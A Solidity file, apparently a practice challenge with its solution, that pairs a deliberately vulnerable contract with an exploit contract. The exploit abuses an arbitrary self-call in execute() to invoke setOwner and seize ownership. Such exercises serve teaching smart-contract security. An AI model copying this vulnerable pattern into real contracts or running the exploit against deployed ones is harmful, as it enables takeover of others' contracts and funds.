// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionSelector {
    address public owner = address(this);

    function setOwner(address _owner) external {
        require(msg.sender == owner, "not owner");
        owner = _owner;
    }

    function execute(bytes4 _func) external {
        (bool executed, ) = address(this).call(
            abi.encodeWithSelector(_func, msg.sender)
        );
        require(executed, "failed)");
    }
}


interface IFunctionSelector {
    function execute(bytes4 func) external;
}

contract FunctionSelectorExploit {
    IFunctionSelector public target;

    constructor(address _target) {
        target = IFunctionSelector(_target);
    }

    function pwn() external {
        // write your code here
        bytes4 _setOwner = bytes4(keccak256(bytes("setOwner(address)")));
        target.execute( _setOwner);
    }
}
